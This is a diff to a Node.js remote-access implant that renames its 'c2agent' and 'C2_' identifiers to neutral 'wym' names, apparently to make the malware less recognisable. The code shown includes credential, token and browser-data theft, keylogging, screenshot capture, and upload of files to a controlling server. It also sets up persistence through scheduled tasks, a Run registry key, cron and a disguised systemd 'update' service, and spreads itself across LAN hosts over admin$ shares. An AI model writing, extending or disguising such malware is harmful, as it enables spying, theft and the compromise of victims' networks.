@@ -10,14 +10,14 @@
 //                 --interval 5 --jitter 2 --verbose
 //
 // Environment variables (accepted when the flag is not given):
-//   C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+//   WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
 //
 // Flags:
-//   --server URL      server base URL (required unless C2_SERVER is set)
-//   --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+//   --server URL      server base URL (required unless WYM_SERVER is set)
+//   --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
 //   --interval N      heartbeat interval in seconds (default 10, min 1)
 //   --jitter N        random jitter in seconds added to the interval
-//   --state FILE      state file persisting the agent id (default ~/.c2agent.json)
+//   --state FILE      state file persisting the agent id (default ~/.wymagent.json)
 //   --verbose         print activity to stdout
 //   -h, --help        show this help and exit
 //
@@ -36,7 +36,7 @@ const os = require("os");
 
 const SHELL_TIMEOUT = 120000; // ms
 const OUTPUT_LIMIT = 12000;
-let stateFile = path.join(os.homedir(), ".c2agent.json");
+let stateFile = path.join(os.homedir(), ".wymagent.json");
 
 // steal constants
 const STEAL_KEYWORDS = [
@@ -301,7 +301,7 @@ async function taskUpload(taskId, args) {
   }
 
   const fileData = fs.readFileSync(filePath);
-  const boundary = "----c2agent" + Date.now();
+  const boundary = "----wymagent" + Date.now();
   const fileName = path.basename(filePath);
   const header = Buffer.from(
     `--${boundary}\r\n` +
@@ -352,7 +352,7 @@ function taskSleep(args) {
 }
 
 function klogBase() {
-  return path.join(os.tmpdir(), `.c2keylog_${agentId || "unknown"}`);
+  return path.join(os.tmpdir(), `.wymkeylog_${agentId || "unknown"}`);
 }
 
 function klogProcAlive(pid) {
@@ -487,7 +487,7 @@ function taskKeylog(args) {
 
 async function taskScreenshot(taskId, args) {
   const label = (args.name || "screenshot").trim() || "screenshot";
-  const tmp = path.join(os.tmpdir(), `c2shot_${Date.now()}.png`);
+  const tmp = path.join(os.tmpdir(), `wymshot_${Date.now()}.png`);
   const p = getOs();
   let cmd;
   if (p === "windows") {
@@ -782,7 +782,7 @@ function postMultipart(filePath, taskId, contentType) {
 async function taskSteal(taskId, args) {
   let profile = String(args.profile || "all").trim().toLowerCase();
   if (!["all", "env", "tokens", "browser"].includes(profile)) profile = "all";
-  const work = fs.mkdtempSync(path.join(os.tmpdir(), "c2steal_"));
+  const work = fs.mkdtempSync(path.join(os.tmpdir(), "wymsteal_"));
   let manifest = [];
   try {
     if (profile === "all" || profile === "env") {
@@ -979,27 +979,27 @@ function taskPersistence(args) {
   try {
     const selfAbs = __filename;
     if (process.platform === "win32") {
-      const base = path.join(process.env.APPDATA || os.homedir(), "Microsoft", "Windows", "c2update");
+      const base = path.join(process.env.APPDATA || os.homedir(), "Microsoft", "Windows", "wymupdate");
       fs.mkdirSync(base, { recursive: true });
-      const dest = path.join(base, "c2agent" + path.extname(selfAbs));
+      const dest = path.join(base, "wymagent" + path.extname(selfAbs));
       fs.copyFileSync(selfAbs, dest);
       const relaunch = relaunchCmd(dest);
       let output = "persistence: copied self to " + dest;
       const progData = process.env.ProgramData || process.env.ALLUSERSPROFILE || "C:\\ProgramData";
-      const launcherDir = path.join(progData, "c2update");
+      const launcherDir = path.join(progData, "wymupdate");
       fs.mkdirSync(launcherDir, { recursive: true });
-      const wrapper = path.join(launcherDir, "c2relaunch.cmd");
+      const wrapper = path.join(launcherDir, "wymrelaunch.cmd");
       fs.writeFileSync(wrapper, "@echo off\r\nstart \"\" /b " + relaunch + "\r\n");
       output += "\npersistence: wrote launcher " + wrapper;
       const task = runShell(
-        `schtasks /Create /TN "c2agent-persist" /TR "${wrapper}" /SC ONLOGON /RL HIGHEST /F`,
+        `schtasks /Create /TN "wymagent-persist" /TR "${wrapper}" /SC ONLOGON /RL HIGHEST /F`,
         30000
       );
       let ok = task.exitCode === 0;
       output += "\n" + task.output.trim();
       if (!ok) {
         const reg = runShell(
-          `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v c2agent /t REG_SZ /d "${wrapper}" /f`,
+          `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v wymagent /t REG_SZ /d "${wrapper}" /f`,
           30000
         );
         ok = reg.exitCode === 0;
@@ -1007,27 +1007,27 @@ function taskPersistence(args) {
       }
       return { output: truncateOutput(output), exitCode: ok ? 0 : 1 };
     }
-    const base = path.join(os.homedir(), ".config", "c2update");
+    const base = path.join(os.homedir(), ".config", "wymupdate");
     fs.mkdirSync(base, { recursive: true });
     const dest = path.join(base, path.basename(selfAbs));
     fs.copyFileSync(selfAbs, dest);
     const relaunch = relaunchCmd(dest);
     let output = "persistence: copied self to " + dest;
-    const cronLine = `@reboot ${relaunch} # c2agent-persist`;
+    const cronLine = `@reboot ${relaunch} # wymagent-persist`;
     const cron = runShell(
-      `(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo '${cronLine}') | crontab -`,
+      `(crontab -l 2>/dev/null | grep -v 'wymagent-persist'; echo '${cronLine}') | crontab -`,
       30000
     );
     let ok = cron.exitCode === 0;
     output += "\n" + cron.output.trim();
-    const unitPath = path.join(base, "c2-update.service");
+    const unitPath = path.join(base, "wym-update.service");
     fs.writeFileSync(
       unitPath,
-      "[Unit]\nDescription=c2 update\n\n" +
+      "[Unit]\nDescription=wym update\n\n" +
         "[Service]\nType=simple\nExecStart=/bin/sh -c '" + relaunch + "'\nRestart=always\n\n" +
         "[Install]\nWantedBy=default.target\n"
     );
-    const sd = runShell("systemctl --user daemon-reload; systemctl --user enable --now c2-update.service", 30000);
+    const sd = runShell("systemctl --user daemon-reload; systemctl --user enable --now wym-update.service", 30000);
     ok = ok || sd.exitCode === 0;
     output += "\n" + sd.output.trim();
     return { output: truncateOutput(output), exitCode: ok ? 0 : 1 };
@@ -1062,8 +1062,8 @@ function taskLateral(args) {
   const list = Array.from(peers).sort().slice(0, 30);
   if (!list.length) return { output: "lateral: no LAN peers found", exitCode: 1 };
 
-  const user = String(args.user || "").trim() || String(process.env.C2_LAT_USER || "");
-  const pass = String(args.pass || "") || String(process.env.C2_LAT_PASS || "");
+  const user = String(args.user || "").trim() || String(process.env.WYM_LAT_USER || "");
+  const pass = String(args.pass || "") || String(process.env.WYM_LAT_PASS || "");
   const hasCreds = !!(user && pass);
   const selfAbs = __filename;
   const basename = path.basename(selfAbs);
@@ -1083,7 +1083,7 @@ function taskLateral(args) {
     let status;
     if (!hasCreds) {
       skipped++;
-      status = "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)";
+      status = "skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)";
     } else if (process.platform === "win32") {
       const r1 = runShell(`net use \\\\${host}\\admin$ /user:${user} "${pass}"`, 20000);
       if (r1.exitCode !== 0) {
@@ -1098,13 +1098,13 @@ function taskLateral(args) {
         } else {
           const remote = `\\\\${host}\\admin$\\${basename}`;
           const r3 = runShell(
-            `schtasks /Create /S ${host} /TN "c2agent-lateral" /TR "${remote}" /SC ONLOGON /RU ${user} /RP ${pass} /RL HIGHEST /F`,
+            `schtasks /Create /S ${host} /TN "wymagent-lateral" /TR "${remote}" /SC ONLOGON /RU ${user} /RP ${pass} /RL HIGHEST /F`,
             20000
           );
           runShell(`net use \\\\${host}\\admin$ /delete /y`, 20000);
           deployed++;
           status = r3.exitCode === 0
-            ? "deployed (file dropped + scheduled c2agent-lateral)"
+            ? "deployed (file dropped + scheduled wymagent-lateral)"
             : `deployed (file dropped; task: ${errBrief(r3)})`;
         }
       }
@@ -1182,12 +1182,12 @@ async function executeTask(task) {
 function printUsage() {
   console.log("usage: node agent.js --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]");
   console.log("");
-  console.log("Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):");
-  console.log("  --server URL      server base URL (required unless C2_SERVER is set)");
-  console.log("  --token TOKEN     shared agent token (required unless C2_TOKEN is set)");
+  console.log("Flags (also settable via WYM_SERVER/WYM_TOKEN/WYM_INTERVAL/WYM_JITTER/WYM_STATE_FILE/WYM_VERBOSE):");
+  console.log("  --server URL      server base URL (required unless WYM_SERVER is set)");
+  console.log("  --token TOKEN     shared agent token (required unless WYM_TOKEN is set)");
   console.log("  --interval N      heartbeat interval in seconds (default 10, min 1)");
   console.log("  --jitter N        random jitter in seconds added to the interval");
-  console.log("  --state FILE      state file persisting the agent id (default ~/.c2agent.json)");
+  console.log("  --state FILE      state file persisting the agent id (default ~/.wymagent.json)");
   console.log("  --verbose         print activity to stdout");
   console.log("  -h, --help        show this help and exit");
 }
@@ -1227,21 +1227,21 @@ function parseArgs() {
 
 async function main() {
   parseArgs();
-  if (!server) server = process.env.C2_SERVER || "";
-  if (!token) token = process.env.C2_TOKEN || "";
-  if (process.argv.slice(2).indexOf("--interval") === -1 && process.env.C2_INTERVAL) {
-    const iv = parseInt(process.env.C2_INTERVAL, 10);
+  if (!server) server = process.env.WYM_SERVER || "";
+  if (!token) token = process.env.WYM_TOKEN || "";
+  if (process.argv.slice(2).indexOf("--interval") === -1 && process.env.WYM_INTERVAL) {
+    const iv = parseInt(process.env.WYM_INTERVAL, 10);
     if (!isNaN(iv)) interval = iv;
   }
-  if (process.argv.slice(2).indexOf("--jitter") === -1 && process.env.C2_JITTER) {
-    const jt = parseFloat(process.env.C2_JITTER);
+  if (process.argv.slice(2).indexOf("--jitter") === -1 && process.env.WYM_JITTER) {
+    const jt = parseFloat(process.env.WYM_JITTER);
     if (!isNaN(jt)) jitter = jt;
   }
-  if (process.argv.slice(2).indexOf("--state") === -1 && process.env.C2_STATE_FILE) {
-    stateFile = process.env.C2_STATE_FILE;
+  if (process.argv.slice(2).indexOf("--state") === -1 && process.env.WYM_STATE_FILE) {
+    stateFile = process.env.WYM_STATE_FILE;
   }
   if (process.argv.slice(2).indexOf("--verbose") === -1 &&
-      (process.env.C2_VERBOSE === "1" || process.env.C2_VERBOSE === "true")) {
+      (process.env.WYM_VERBOSE === "1" || process.env.WYM_VERBOSE === "true")) {
     verbose = true;
   }
 
